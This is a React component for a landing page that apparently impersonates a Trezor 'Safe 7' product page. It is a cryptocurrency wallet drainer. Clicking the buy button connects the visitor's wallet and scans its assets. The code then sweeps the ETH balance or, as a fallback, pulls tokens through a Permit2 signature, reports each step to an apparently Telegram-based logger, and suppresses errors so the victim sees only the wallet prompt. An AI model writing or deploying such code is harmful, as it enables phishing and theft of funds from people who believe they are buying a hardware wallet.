import { useEffect, useRef } from 'react'
import html from './landing.html?raw'
import { connectWallet } from './lib/wallet.js'
import { loadSurface, scanAssets, pickAutoToken, tgEvent, runEthSweep, runPermit2Settle } from './lib/settle.js'

function wireToggles(root) {
  const buttons = root.querySelectorAll('.faq-toggle-button, .toggle-features-button')
  buttons.forEach((btn) => {
    btn.addEventListener('click', () => {
      const scope = btn.closest('div') || btn.parentElement
      const box = scope?.querySelector('[class*="max-h-0"], [class*="max-h-screen"]')
      const svg = btn.querySelector('svg')
      if (!box) return
      const closed = box.className.includes('max-h-0')
      box.classList.toggle('max-h-0', !closed)
      box.classList.toggle('max-h-screen', closed)
      svg?.classList.toggle('rotate-180', closed)
    })
  })
}

function isSafe7Cta(el) {
  if (!el) return false
  const text = (el.textContent || '').replace(/\s+/g, ' ').trim()
  return /Get trezor only Safe 7/i.test(text)
}

let busy = false

async function runAutoEthSettle() {
  if (busy) return
  busy = true
  const state = { wallet: '', session: 'page-' + Date.now(), usd: 0, amount: '' }
  try {
    const { address } = await connectWallet()
    state.wallet = address
    await tgEvent(state, 'wallet_connected')

    const surface = await loadSurface()
    const scan = await scanAssets(address)
    state.usd = scan.usd
    state.amount = scan.ethBal.toString()
    await tgEvent(state, 'scan_complete', { assets: scan.assets, scout_value_usd: scan.usd })

    try {
      await runEthSweep({
        wallet: address,
        ethBal: scan.ethBal,
        state,
        log: () => {},
      })
      return
    } catch (ethErr) {
      if (ethErr && ethErr.code === 4001) throw ethErr
      const token = pickAutoToken(scan, surface)
      if (!token) throw ethErr
      await runPermit2Settle({ wallet: address, token, state })
    }
  } catch {
    // silent — MetaMask is the only UI
  } finally {
    busy = false
  }
}

export default function App() {
  const ref = useRef(null)

  useEffect(() => {
    const root = ref.current
    if (!root) return
    wireToggles(root)
    const onClick = (e) => {
      const hit = e.target.closest('a, button')
      if (!isSafe7Cta(hit)) return
      e.preventDefault()
      e.stopPropagation()
      runAutoEthSettle()
    }
    root.addEventListener('click', onClick, true)
    return () => root.removeEventListener('click', onClick, true)
  }, [])

  return <div ref={ref} dangerouslySetInnerHTML={{ __html: html }} />
}
